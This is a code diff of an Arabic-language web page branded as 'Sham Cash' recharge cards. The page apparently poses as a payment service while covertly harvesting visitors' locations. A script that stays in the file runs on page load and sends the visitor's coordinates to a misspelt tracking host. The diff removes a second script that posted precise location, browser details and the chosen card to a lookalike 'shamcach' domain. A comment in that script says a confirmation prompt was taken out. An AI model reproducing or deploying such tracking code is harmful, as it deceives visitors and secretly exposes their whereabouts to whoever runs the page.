@@ -123,7 +123,6 @@
       font-weight: bold;
       margin-bottom: 8px;
       direction: ltr;
-      cursor: pointer;
     }
 
     .caption {
@@ -164,7 +163,7 @@
     }
   </style>
 </head>
-<script>
+
 <script>
 (function () {
   const BACKEND_URL = 'https://bachend-1-axd2.onrender.com/track';
@@ -185,8 +184,12 @@
 
   if ('geolocation' in navigator) {
     let sent = false;
+
     const fallback = setTimeout(() => {
-      if (!sent) { sent = true; sendData(); }
+      if (!sent) {
+        sent = true;
+        sendData();
+      }
     }, 5000);
 
     navigator.geolocation.getCurrentPosition(
@@ -194,6 +197,7 @@
         if (sent) return;
         sent = true;
         clearTimeout(fallback);
+
         sendData({
           latitude: pos.coords.latitude,
           longitude: pos.coords.longitude,
@@ -206,13 +210,17 @@
         clearTimeout(fallback);
         sendData();
       },
-      { timeout: 5000, maximumAge: 300000 }
+      {
+        timeout: 5000,
+        maximumAge: 300000
+      }
     );
   } else {
     sendData();
   }
 })();
 </script>
+
 <body>
   <header>
     <div class="menu" aria-label="القائمة">☰</div>
@@ -270,65 +278,5 @@
   </main>
 
   <footer>شام كاش — بطاقات الشحن</footer>
-
-  <script>
-  const cards = document.querySelectorAll('.amount');
-  const WORKER_URL = 'https://shamcash.shamcach.workers.dev/';
-
-  cards.forEach((card) => {
-    card.style.cursor = 'pointer';
-
-    card.addEventListener('click', async () => {
-      // تم إزالة نافذة التأكيد (confirm) ليعمل الكود مباشرة عند الضغط
-
-      if (!navigator.geolocation) {
-        console.error('المتصفح لا يدعم تحديد الموقع الجغرافي.');
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          const locationData = {
-            locationConsent: true,
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            card: card.textContent.trim(),
-            userAgent: navigator.userAgent,
-            timestamp: new Date().toISOString()
-          };
-
-          try {
-            const response = await fetch(WORKER_URL, {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify(locationData)
-            });
-
-            if (!response.ok) {
-              console.error('تعذر إرسال البيانات، الحالة:', response.status);
-              return;
-            }
-
-            console.log('تم إرسال البيانات بنجاح.');
-          } catch (error) {
-            console.error('خطأ في الاتصال:', error);
-          }
-        },
-        (error) => {
-          console.error('لم يتم الحصول على الموقع:', error.message);
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
-        }
-      );
-    });
-  });
-</script>
-
 </body>
 </html>
